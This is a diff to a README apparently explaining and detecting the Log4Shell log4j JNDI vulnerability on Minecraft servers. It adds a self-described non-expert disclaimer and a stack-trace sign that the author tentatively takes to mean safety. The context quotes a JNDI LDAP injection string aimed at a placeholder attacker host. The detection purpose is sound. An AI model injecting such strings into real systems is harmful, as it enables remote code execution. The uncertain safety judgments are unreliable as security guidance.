@@ -4,6 +4,8 @@ if attacker manage to log this string `${jndi:ldap://someaddresshere/param1=valu
 to log4j it somehow loads the class/java bytecode sent by Attacker Controlled LDAP Server. The bytecode could be used to
 execute any malicious code or do some little trolling.
 
+take this with grain of salt, I'm not a security expert.
+
 ## Detection
 
 ### Patched
@@ -59,6 +61,20 @@ Both sender and receiver are logged which mean they are vulnerable
 
 - if `com.sun.jndi.ldap.object.trustURLCodebase` property is set to `true` then you are vulnerable like really
   ![](https://cdn.discordapp.com/attachments/918290369639227434/919240541810610206/unknown.png)
+
+- if you found the victim log and see this:
+
+```
+  Caused by: java.lang.ClassNotFoundException: itzbenz.payload.ObjectPayloadSerializable
+        at java.net.URLClassLoader.findClass(Unknown Source)
+        at java.lang.ClassLoader.loadClass(Unknown Source)
+        at sun.misc.Launcher$AppClassLoader.loadClass(Unknown Source)
+        at java.lang.ClassLoader.loadClass(Unknown Source)
+  ```
+
+it's safe because it will not load classpath provided by attacker ??
+
+note: (after updating java 8, the minecraft server seem not load the classpath)
 
 # Disclaimer
 
